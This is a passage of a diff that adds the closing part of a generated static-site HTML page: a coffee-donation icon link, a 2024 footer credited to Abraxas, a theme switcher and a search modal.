+        d="M879.567 341.849L872.53 306.352C866.215 274.503 851.882 244.409 819.19 232.898C808.711 229.215 796.821 227.633 788.786 220.01C780.751 212.388 778.376 200.55 776.518 189.572C773.076 169.423 769.842 149.257 766.314 129.143C763.269 111.85 760.86 92.4243 752.928 76.56C742.604 55.2584 721.182 42.8009 699.88 34.559C688.965 30.4844 677.826 27.0375 666.517 24.2352C613.297 10.1947 557.342 5.03277 502.591 2.09047C436.875 -1.53577 370.983 -0.443234 305.422 5.35968C256.625 9.79894 205.229 15.1674 158.858 32.0469C141.91 38.224 124.445 45.6399 111.558 58.7341C95.7448 74.8221 90.5829 99.7026 102.128 119.765C110.336 134.012 124.239 144.078 138.985 150.737C158.192 159.317 178.251 165.846 198.829 170.215C256.126 182.879 315.471 187.851 374.007 189.968C438.887 192.586 503.87 190.464 568.44 183.618C584.408 181.863 600.347 179.758 616.257 177.304C634.995 174.43 647.022 149.928 641.499 132.859C634.891 112.453 617.134 104.538 597.055 107.618C594.095 108.082 591.153 108.512 588.193 108.942L586.06 109.252C579.257 110.113 572.455 110.915 565.653 111.661C551.601 113.175 537.515 114.414 523.394 115.378C491.768 117.58 460.057 118.595 428.363 118.647C397.219 118.647 366.058 117.769 334.983 115.722C320.805 114.793 306.661 113.611 292.552 112.177C286.134 111.506 279.733 110.801 273.333 110.009L267.241 109.235L265.917 109.046L259.602 108.134C246.697 106.189 233.792 103.953 221.025 101.251C219.737 100.965 218.584 100.249 217.758 99.2193C216.932 98.1901 216.482 96.9099 216.482 95.5903C216.482 94.2706 216.932 92.9904 217.758 91.9612C218.584 90.9319 219.737 90.2152 221.025 89.9293H221.266C232.33 87.5721 243.479 85.5589 254.663 83.8038C258.392 83.2188 262.131 82.6453 265.882 82.0832H265.985C272.988 81.6186 280.026 80.3625 286.994 79.5366C347.624 73.2302 408.614 71.0801 469.538 73.1014C499.115 73.9618 528.676 75.6996 558.116 78.6935C564.448 79.3474 570.746 80.0357 577.043 80.8099C579.452 81.1025 581.878 81.4465 584.305 81.7391L589.191 82.4445C603.438 84.5667 617.61 87.1419 631.708 90.1703C652.597 94.7128 679.422 96.1925 688.713 119.077C691.673 126.338 693.015 134.408 694.649 142.03L696.731 151.752C696.786 151.926 696.826 152.105 696.852 152.285C701.773 175.227 706.7 198.169 711.632 221.111C711.994 222.806 712.002 224.557 711.657 226.255C711.312 227.954 710.621 229.562 709.626 230.982C708.632 232.401 707.355 233.6 705.877 234.504C704.398 235.408 702.75 235.997 701.033 236.236H700.895L697.884 236.649L694.908 237.044C685.478 238.272 676.038 239.419 666.586 240.486C647.968 242.608 629.322 244.443 610.648 245.992C573.539 249.077 536.356 251.102 499.098 252.066C480.114 252.57 461.135 252.806 442.162 252.771C366.643 252.712 291.189 248.322 216.173 239.625C208.051 238.662 199.93 237.629 191.808 236.58C198.106 237.389 187.231 235.96 185.029 235.651C179.867 234.928 174.705 234.177 169.543 233.397C152.216 230.798 134.993 227.598 117.7 224.793C96.7944 221.352 76.8005 223.073 57.8906 233.397C42.3685 241.891 29.8055 254.916 21.8776 270.735C13.7217 287.597 11.2956 305.956 7.64786 324.075C4.00009 342.193 -1.67805 361.688 0.472751 380.288C5.10128 420.431 33.165 453.054 73.5313 460.35C111.506 467.232 149.687 472.807 187.971 477.556C338.361 495.975 490.294 498.178 641.155 484.129C653.44 482.982 665.708 481.732 677.959 480.378C681.786 479.958 685.658 480.398 689.292 481.668C692.926 482.938 696.23 485.005 698.962 487.717C701.694 490.429 703.784 493.718 705.08 497.342C706.377 500.967 706.846 504.836 706.453 508.665L702.633 545.797C694.936 620.828 687.239 695.854 679.542 770.874C671.513 849.657 663.431 928.434 655.298 1007.2C653.004 1029.39 650.71 1051.57 648.416 1073.74C646.213 1095.58 645.904 1118.1 641.757 1139.68C635.218 1173.61 612.248 1194.45 578.73 1202.07C548.022 1209.06 516.652 1212.73 485.161 1213.01C450.249 1213.2 415.355 1211.65 380.443 1211.84C343.173 1212.05 297.525 1208.61 268.756 1180.87C243.479 1156.51 239.986 1118.36 236.545 1085.37C231.957 1041.7 227.409 998.039 222.9 954.381L197.607 711.615L181.244 554.538C180.968 551.94 180.693 549.376 180.435 546.76C178.473 528.023 165.207 509.681 144.301 510.627C126.407 511.418 106.069 526.629 108.168 546.76L120.298 663.214L145.385 904.104C152.532 972.528 159.661 1040.96 166.773 1109.41C168.15 1122.52 169.44 1135.67 170.885 1148.78C178.749 1220.43 233.465 1259.04 301.224 1269.91C340.799 1276.28 381.337 1277.59 421.497 1278.24C472.979 1279.07 524.977 1281.05 575.615 1271.72C650.653 1257.95 706.952 1207.85 714.987 1130.13C717.282 1107.69 719.576 1085.25 721.87 1062.8C729.498 988.559 737.115 914.313 744.72 840.061L769.601 597.451L781.009 486.263C781.577 480.749 783.905 475.565 787.649 471.478C791.392 467.391 796.352 464.617 801.794 463.567C823.25 459.386 843.761 452.245 859.023 435.916C883.318 409.918 888.153 376.021 879.567 341.849ZM72.4301 365.835C72.757 365.68 72.1548 368.484 71.8967 369.792C71.8451 367.813 71.9483 366.058 72.4301 365.835ZM74.5121 381.94C74.6842 381.819 75.2003 382.508 75.7337 383.334C74.925 382.576 74.4089 382.009 74.4949 381.94H74.5121ZM76.5597 384.641C77.2996 385.897 77.6953 386.689 76.5597 384.641V384.641ZM80.672 387.979H80.7752C80.7752 388.1 80.9645 388.22 81.0333 388.341C80.9192 388.208 80.7925 388.087 80.6548 387.979H80.672ZM800.796 382.989C793.088 390.319 781.473 393.726 769.996 395.43C641.292 414.529 510.713 424.199 380.597 419.932C287.476 416.749 195.336 406.407 103.144 393.382C94.1102 392.109 84.3197 390.457 78.1082 383.798C66.4078 371.237 72.1548 345.944 75.2003 330.768C77.9878 316.865 83.3218 298.334 99.8572 296.355C125.667 293.327 155.64 304.218 181.175 308.09C211.917 312.781 242.774 316.538 273.745 319.36C405.925 331.405 540.325 329.529 671.92 311.91C695.905 308.686 719.805 304.941 743.619 300.674C764.835 296.871 788.356 289.731 801.175 311.703C809.967 326.673 811.137 346.701 809.778 363.615C809.359 370.984 806.139 377.915 800.779 382.989H800.796Z"
+        fill="#0D0C22" />
+</svg>
+</span></span><span
+                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                    >BuyMeACoffee</span
+                  >
+                </a
+              >
+            
+          </li>
+        
+      </ul>
+    </nav>
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            Abraxas
+        </p>
+      
+      
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+        <div
+          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        >
+          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
+            <div
+              class="flex h-12 w-12 items-center justify-center dark:hidden"
+              title="Switch to dark appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+            </div>
+            <div
+              class="hidden h-12 w-12 items-center justify-center dark:flex"
+              title="Switch to light appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+            </div>
+          </button>
+        </div>
+      
+    </div>
+  </div>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm sm:p-6 md:p-[10vh] lg:p-[12vh] dark:bg-neutral-900/50"
+  data-url="//localhost:1313/"
+>
+  <div
+    id="search-modal"
+    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex flex-none items-center justify-between px-2">
+      <form class="flex min-w-0 flex-auto items-center">
+        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto overflow-auto px-2">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+</html>
